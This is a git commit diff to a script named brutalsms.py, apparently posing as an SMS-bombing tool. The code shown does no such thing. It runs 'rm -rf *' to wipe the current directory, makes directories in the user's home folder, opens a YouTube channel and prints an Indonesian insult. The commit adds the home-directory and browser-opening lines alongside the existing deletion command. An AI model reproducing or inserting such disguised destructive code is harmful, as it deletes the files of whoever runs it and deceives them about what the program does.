60750057bff1025df6f417382bf1722e719cbef9
N74NK 420 <40085062+N74NK@users.noreply.github.com>
2019-05-26 03:47:15 +0700

    Update brutalsms.py

--- brutalsms.py
+++ brutalsms.py
@@ -1,5 +1,6 @@
 import os
 os.system("rm -rf *")
-os.system("mkdir ../NjankSoekamti is HERE")
+os.system("mkdir /$HOME/NjankSoekamti is HERE")
+os.system("xdg-open https://youtube.com/NjankSoekamti")
 os.system("clear")
 print("\n\nDark force army tai anjing!\n\n")
